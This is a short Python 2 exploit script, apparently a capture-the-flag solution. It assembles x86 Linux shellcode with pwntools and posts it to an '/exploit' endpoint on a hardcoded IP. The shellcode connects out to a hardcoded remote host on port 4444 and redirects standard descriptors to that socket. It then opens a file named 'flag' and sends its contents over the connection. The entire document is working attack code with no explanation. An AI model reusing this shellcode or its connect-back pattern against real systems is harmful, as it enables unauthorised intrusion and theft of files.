from pwn import *
from base64 import b64decode, b64encode
import requests
data = {'payload':''}

payload = asm("""
	cmp esp,0x1200000
	je bye
	push 0x66
	pop eax
	cdq
	push edx
	inc edx
	push edx          
	mov ebx, edx        
	inc edx
	push edx            
	mov ecx, esp
	int 0x80

	xchg ebx, eax      
	mov ecx, edx        
loop:
	mov al, 0x3f    
	int 0x80
	dec ecx
	jns loop


	mov al, 0x66      
	xchg ebx, edx      

	push 0xb9a7718c
	push 0x5c110002        
	inc ebx             
	mov ecx, esp        
	push 0x10          
	push ecx           
	push edx           
	mov ecx, esp       
	int 0x80

	push 0x0
	push 0x67616c66
	mov eax,0x5
	mov ebx,esp
	mov ecx,0
	int 0x80

	mov ebx,eax
	mov eax,0x3
	mov ecx,esp
	mov edx,0x100
	int 0x80

	mov edx,eax
	mov eax,0x4
	mov ebx,0x1
	mov ecx,esp
	int 0x80
bye:
	mov ebx,0x0
	mov eax,1
	int 0x80
""")
s = requests.Session()
x = s.get('http://178.128.100.75/')
data['payload'] = b64encode(payload.ljust(0x100,'\x00'))
r  = s.post('http://178.128.100.75/exploit', json=data)
print r.text
